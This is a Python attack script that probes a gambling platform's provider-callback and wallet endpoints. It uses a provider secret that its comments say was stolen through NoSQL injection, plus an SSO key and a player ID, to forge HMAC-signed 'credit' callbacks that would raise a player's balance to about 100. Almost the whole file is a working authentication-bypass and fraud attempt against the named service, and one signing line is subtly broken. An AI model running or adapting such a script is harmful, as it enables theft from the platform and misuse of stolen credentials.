#!/usr/bin/env python3
"""probe41_callbacks.py — Game provider callback endpoint discovery + auth probe.

Tests Z-Seamless /mb/seamless* and other provider-facing endpoints to find
which accept provider HMAC (vs player JWT). Uses JILI secret from F02.
"""
import requests, json, hmac, hashlib, time, sys, base64

TID = "54ef7626cb381f4bab8be91f0cdbce47"  # we88c
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"

# JILI secret extracted via F02 (NoSQL injection) — vak88z2 tenant
# we88c likely uses same provider integration
JILI_SECRET_VAK = "a68a21221d37222969b99ea0463be0f0a9e51d2ce70aedf28afbeec96ec88e82"
PLAYER_ID_WE = "266d74e3-d6ca-47eb-b9ac-b8c45574bad4"

# Read player JWT for we88c
import pathlib, base64 as b64
jwt_path = pathlib.Path(".jwt.we88c")
jwt = jwt_path.read_text().strip() if jwt_path.exists() else ""

ENDPOINTS = [
    "mb/zseamless/callback",
    "mb/z-seamless",
    "mb/z-seamless/callback",
    "mb/seamless/callback",
    "mb/seamless/credit",
    "mb/seamless/wallet",
    "mb/jili/callback",
    "mb/wallet/credit",
    "mb/provider/debit",
    "mb/provider/balance",
    "mb/provider-notify",
    "mb/game/credit",
]

print("=== 1. Check response bodies (no auth) ===")
for ep in ENDPOINTS:
    r = requests.post(f"{MGAPI}/{ep}", json={"test": 1},
                      headers={"Content-Type": "application/json", "template": "vn"},
                      timeout=8)
    body = r.text[:150]
    print(f"  {r.status_code} /{ep}: {body}")

print("\n=== 2. Probe with JILI-style auth headers ===")
# JILI callback typically: X-Signature = HMAC-SHA256(key=secret, msg=body_json)
# Or: sign param in body
sso_key = "ea5631f7ed7cc16bba619cc1f561ad6b4aacf151"
api_id = "1701"

for ep in ["mb/zseamless/callback", "mb/z-seamless/callback", "mb/seamless/credit"]:
    # Build a realistic JILI bet-settle callback
    payload = {
        "ssoKey": sso_key,
        "userId": PLAYER_ID_WE,
        "apiId": api_id,
        "amount": 100.00,
        "type": "credit",
        "txnId": f"JILI{int(time.time())}",
        "round": int(time.time()),
        "beforeBalance": 0.07,
        "afterBalance": 100.07,
    }
    body_str = json.dumps(payload, separators=(',', ':'))
    sig_v1 = hmac.new(JILI_SECRET_VAK.encode(), body_str.encode(), hashlib.sha256).hexdigest()

    for headers_variant, name in [
        ({"X-Signature": sig_v1, "Content-Type": "application/json", "template": "vn"}, "X-Sig HMAC"),
        ({"Authorization": f"Bearer {JILI_SECRET_VAK}", "Content-Type": "application/json", "template": "vn"}, "Bearer secret"),
        ({"X-Api-Key": JILI_SECRET_VAK, "Content-Type": "application/json", "template": "vn"}, "X-Api-Key"),
    ]:
        r = requests.post(f"{MGAPI}/{ep}", data=body_str, headers=headers_variant, timeout=8)
        if r.status_code != 401:
            print(f"  ** {r.status_code} /{ep} [{name}]: {r.text[:200]}")
        else:
            print(f"  {r.status_code} /{ep} [{name}]: {r.text[:60]}")

print("\n=== 3. Probe /mb/seamless/* with player JWT + sign ===")
# Maybe seamless endpoints accept player JWT with provider sign
payload2 = {"amount": 100, "sign": hmac.new(JILI_SECRET_VAK.encode(), b"100".encode(), hashlib.sha256).hexdigest()}
for ep in ["mb/seamless/credit", "mb/wallet/credit", "mb/game/credit"]:
    r = requests.post(f"{MGAPI}/{ep}", json=payload2,
                      headers={"Authorization": f"Bearer {jwt}", "template": "vn",
                                "Content-Type": "application/json"},
                      timeout=8)
    print(f"  {r.status_code} /{ep}: {r.text[:150]}")

print("\n=== DONE ===")
